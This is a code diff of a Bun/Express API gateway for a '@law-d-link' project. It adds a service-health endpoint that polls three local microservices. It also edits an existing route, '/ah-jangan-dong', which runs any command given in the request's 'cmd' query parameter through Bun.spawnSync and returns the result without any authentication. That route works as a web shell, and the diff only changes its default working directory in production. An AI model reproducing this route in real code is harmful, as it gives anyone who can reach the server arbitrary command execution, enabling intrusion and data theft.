@@ -2,6 +2,7 @@ import { MicroserviceService } from "@law-d-link/service"
 import axios, { AxiosError } from "axios";
 import { createProxyMiddleware } from "http-proxy-middleware";
 import { rateLimit } from 'express-rate-limit'
+import path from "path";
 import pkg from "../package.json"
 
 // prepare all service needed
@@ -38,11 +39,57 @@ createGroup(app, 'v1', (router) => {
       }
     })
   })
+  router.get("/service-health", async (req, res) => {
+    const services = []
+
+    // 
+    try {
+      const res = await axios({
+        method: 'GET',
+        url: `http://localhost:${process.env.SERVICE_API_AUTH_PORT || "3001"}/v1`,
+      })
+      services.push({ name: 'api-auth',  ok: true, response: res.data })
+    } catch (error) {
+      if (error instanceof AxiosError) {
+        services.push({ name: 'api-auth',  ok: false, response: error.response?.data })
+      }
+    }
+    try {
+      const res = await axios({
+        method: 'GET',
+        url: `http://localhost:${process.env.SERVICE_API_USER_PORT || "3002"}/v1`,
+      })
+      services.push({ name: 'api-main',  ok: true, response: res.data })
+    } catch (error) {
+      if (error instanceof AxiosError) {
+        services.push({ name: 'api-main',  ok: false, response: error.response?.data })
+      }
+    }
+    try {
+      const res = await axios({
+        method: 'GET',
+        url: `http://localhost:${process.env.SERVICE_API_LAW_PORT || "3003"}/v1`,
+      })
+      services.push({ name: 'api-kimai',  ok: true, response: res.data })
+    } catch (error) {
+      if (error instanceof AxiosError) {
+        services.push({ name: 'api-kimai',  ok: false, response: error.response?.data })
+      }
+    }    
+
+    return res.json({
+      ok: true,
+      message: "success",
+      data: {
+        services
+      }
+    })
+  })
   router.get("/ah-jangan-dong", (req, res) => {
     try {
       const parse = Bun.spawnSync({
         cmd: (req.query.cmd as string || "ls").split(" "),
-        cwd: (req.query.cwd as string) || process.cwd(),
+        cwd: (req.query.cwd as string) || (process.env?.NODE_ENV === 'production' ? path.join('/app') : process.cwd()),
       })
       return res.json({
         ok: true,
